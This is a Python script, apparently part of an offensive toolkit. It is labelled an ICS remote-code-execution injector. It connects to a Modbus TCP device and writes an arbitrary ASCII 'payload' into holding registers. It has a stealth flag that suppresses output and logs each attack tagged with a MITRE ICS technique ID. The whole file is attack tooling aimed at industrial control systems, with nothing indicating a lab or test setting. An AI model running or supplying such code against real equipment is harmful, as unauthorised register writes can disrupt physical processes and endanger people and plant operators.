# modules/exploits/modbus_rce_script_executor.py

import argparse
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.payload import BinaryPayloadBuilder
from pymodbus.constants import Endian
import json
import os
from datetime import datetime

LOG_FILE = "results/exploit_logs.json"
MITRE_TTP = "T0851"  # Control System Command Injection

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def inject_payload(host, port, register, script_value, stealth=False):
    client = ModbusTcpClient(host, port=port)
    connected = client.connect()
    if not connected:
        print(f"[!] Failed to connect to Modbus target {host}:{port}")
        return

    builder = BinaryPayloadBuilder(byteorder=Endian.Big, wordorder=Endian.Big)
    for char in script_value:
        builder.add_16bit_uint(ord(char))

    payload = builder.to_registers()

    try:
        result = client.write_registers(register, payload, unit=1)
        if not stealth:
            print(f"[âœ“] Payload sent to Modbus register {register}")
    except Exception as e:
        print(f"[!] Exception during Modbus write: {e}")
    finally:
        client.close()

    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "target": host,
        "port": port,
        "register": register,
        "payload": script_value,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus Script Injector (ICS RCE)")
    parser.add_argument("--host", required=True, help="Modbus TCP host")
    parser.add_argument("--port", default=502, type=int, help="Modbus TCP port")
    parser.add_argument("--register", default=40001, type=int, help="Starting register to inject payload")
    parser.add_argument("--script", required=True, help="ASCII payload/script to inject")
    parser.add_argument("--stealth", action="store_true", help="Suppress output")
    args = parser.parse_args()

    inject_payload(args.host, args.port, args.register, args.script, args.stealth)
